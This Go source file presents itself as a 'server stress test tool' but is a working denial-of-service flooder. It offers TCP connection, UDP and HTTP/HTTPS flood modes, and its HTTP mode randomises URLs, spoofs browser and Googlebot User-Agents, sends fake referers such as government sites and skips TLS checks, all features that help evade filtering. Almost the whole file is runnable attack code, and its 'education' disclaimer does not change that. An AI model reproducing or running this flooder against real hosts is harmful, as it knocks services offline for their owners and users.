/*
Coded By Leeon123
Date: 12/5/2019
|------------------------------------------------|
|  This tool is a server stress test tool,       |
|  It is only use for testing server firewall    |
|  and education.                                |
|------------------------------------------------|
Updated: 6/8/2020
*/
package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

//Start of Random useragent
var (
	str       string = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM=&"
	succ             = 0
	fail             = 0
	acceptall        = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, /;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,/;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, ;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, /\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, /\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, /;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, /;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, ;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,/;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	start    = make(chan bool)
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://www.police.gov.hk/",
		"https://www.mjib.gov.tw/",
		"https://www.president.gov.tw/",
		"https://www.gov.hk",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
)

func useragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	fmt.Println("|--------------------------------------|")
	fmt.Println("|   Golang : Server Stress Test Tool   |")
	fmt.Println("|          C0d3d By Lee0n123           |")
	fmt.Println("|--------------------------------------|")
	if len(os.Args) != 7 {
		fmt.Printf("Usage: %s host port mode connections seconds timeout(second)\r\n", os.Args[0])
		fmt.Println("|--------------------------------------|")
		fmt.Println("|             Mode List                |")
		fmt.Println("|     [1] TCP-Connection flood         |")
		fmt.Println("|     [2] UDP-flood                    |")
		fmt.Println("|     [3] HTTP-flood(Auto SSL)         |")
		fmt.Println("|--------------------------------------|")
		os.Exit(1)
	}

	count := 0
	stop := 0 //stop
	errn := 0
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("port should be a integer")
		return
	}
	connections, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("connections should be a integer")
		return
	}
	times, err := strconv.Atoi(os.Args[5])
	if err != nil {
		fmt.Println("seconds should be a integer")
		return
	}
	timeout, err := strconv.Atoi(os.Args[6])
	if err != nil {
		fmt.Println("timeout should be a integer")
		return
	}
	addr := os.Args[1]
	addr += ":"
	addr += os.Args[2]
	var wg sync.WaitGroup
	if os.Args[3] == "1" { //Tcp connection flood
		payload := "\000"
		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func(wg *sync.WaitGroup) {
				defer wg.Done()
				s, err := net.DialTimeout("tcp", addr, time.Duration(timeout)*time.Second)
				if err != nil {
					errn++
					return
				}
				if s, ok := s.(*net.TCPConn); ok {
					s.SetNoDelay(false)
				}
				err = s.(*net.TCPConn).SetKeepAlive(true)
				if err != nil {
					errn++
					return
				}
				for {
					if stop > 0 {
						_, err := s.Write([]byte(payload)) //check if it still alive
						if err != nil {
							errn++
						} else {
							count++
						}
						break
					} else {
						time.Sleep(time.Millisecond * 100)
					}
				}

			}(&wg)
		}
		time.Sleep(time.Second * time.Duration(times)) //timer
		stop++
		wg.Wait()
		fmt.Println("Total connection:", connections)
		fmt.Println("Connection Alive:", count+1)
		fmt.Println("Connection Error:", errn, "times")
	} else if os.Args[3] == "2" { //udpflood
		bit := 0
		ip, err := net.LookupIP(os.Args[1])
		if err != nil {
			fmt.Printf("Error occurred when resolve ip: %s \n", err)
			return
		}
		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func(wg *sync.WaitGroup, i int) {
				defer wg.Done()
				conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 1337 + i})
				if err != nil {
					fmt.Println("Error listening:", err)

				}
				defer conn.Close()
				for {
					buffer := make([]byte, 128)
					rand.Read(buffer)
					if stop > 0 {
						break
					}
					for i := 0; i < 100; i++ {
						conn.WriteToUDP(buffer, &net.UDPAddr{IP: ip[0], Port: port})
						count++
						bit += 1024
					}
				}
			}(&wg, i)
		}
		time.Sleep(time.Second * time.Duration(times)) //timer
		stop++
		wg.Wait()
		fmt.Println("Total Sent:", bit/1024/1024, "Mb")
		fmt.Printf("Mbps: %.2f Mb/s\r\n", float64(bit)/1024/1024/float64(times))
		fmt.Printf("PPS: %.2f packets/s\r\n", float64(count/times+0/5))
		//fmt.Println("Connection Error:",error,"times")
	} else if os.Args[3] == "3" { //http/s flood
		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func(wg *sync.WaitGroup) {
				defer wg.Done()
				for {
					if stop > 0 {
						break
					}
					s, err := net.DialTimeout("tcp", addr, time.Duration(timeout)*time.Second)
					if err != nil {
						errn++
						return
					}
					if os.Args[2] == "443" {
						s = tls.Client(s, &tls.Config{
							ServerName: addr, InsecureSkipVerify: true,
						})
					}
					if s, ok := s.(*net.TCPConn); ok {
						s.SetNoDelay(false)
					}
					defer s.Close()
					payload := " HTTP/1.1\r\nHost: " + os.Args[1] + "\r\nConnection: Keep-Alive\r\nUser-Agent: " + useragent() + "\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n\r\n"
					for t := 0; t < 140; t++ {
						s.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
						url := "GET /?" + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) //random url                                                                                                                                                                                                                                                                    // big buffer
						tmp := make([]byte, 256)                                                                                                                                                                                                                                                                          // using small tmo buffer for demonstrating
						s.Write([]byte(url + payload))
						count++
						_, err := s.Read(tmp)
						if err != nil {
							fail++
						} else {
							succ++
						}
					}
				}
			}(&wg)
		}
		time.Sleep(time.Second * time.Duration(times)) //timer
		stop++
		wg.Wait()
		fmt.Println("Total Sent:", count, "requests")
		fmt.Printf("RPS: %.2f requests/s\r\n", float64(count)/float64(times))
		fmt.Printf("Successed Rate: %.2f%%\r\n", float64(succ)/float64(count)*100)
		fmt.Printf("Dropped: %d\r\n", fail)
		fmt.Println("Connection Error:", errn, "times")
	}
}
